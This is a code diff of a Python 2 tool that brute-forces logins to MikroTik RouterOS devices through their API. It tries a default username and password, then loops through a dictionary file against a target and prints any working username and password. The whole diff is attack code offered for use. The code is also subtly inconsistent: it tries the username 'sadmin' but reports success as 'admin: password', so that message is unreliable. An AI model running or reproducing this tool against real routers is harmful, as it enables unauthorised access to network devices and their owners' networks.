@@ -33,8 +33,6 @@ def run(pwd_num):
 
 
 def main(args):
-    print args
-    print ""
     print("[*] Starting bruteforce attack...")
     print("-" * 33 + "\n")
 
@@ -44,22 +42,24 @@ def main(args):
     try:
         routeros_api.connect(
             args['<TARGET>'],
-            'assdmin',
+            'sadmin',
             'password'
         )
+        success = True
+    except:
+        pass
+
+    if success:
         alert = "[+] Login successful!!!"
         alert += " Default RouterOS credentials were not changed."
         print alert + " Log in with admin: password"
-        success = True
-
-    except:
-        alert = "[-] Default RouterOS credentials were unsuccessful, "
-        alert += "trying with passwords in list..."
+    else:
+        alert = "[-] Default RouterOS credentials were unsuccessful."
         print alert
         print ""
         time.sleep(1)
 
-    if not success:
+        print "[-] Trying with passwords in list..."
         dict_file = codecs.open(
             args['<DICT>'],
             'rb', encoding='utf-8',
@@ -76,20 +76,20 @@ def main(args):
             if not args['--quiet']:
                 alert = "[-] Trying {} of {} passwords".format(
                     str(items), str(psswd_count))
-                print alert + "- current: " + password
+                print alert + " - current: " + password
 
             try:
-                    routeros_api.connect(
-                        args['<TARGET>'],
-                        args['--user'],
-                        password
-                    )
-                    print ''
-                    alert = "[+] Login successful!!! "
-                    alert += "User: " + args['--user'] + ", Password: " + password
-                    print alert
-                    success = True
-                    break
+                routeros_api.connect(
+                    args['<TARGET>'],
+                    args['--user'],
+                    password
+                )
+                print ""
+                alert = "[+] Login successful!!! "
+                alert += "User: " + args['--user'] + ", Password: " + password
+                print alert
+                success = True
+                break
             except:
                 pass
 
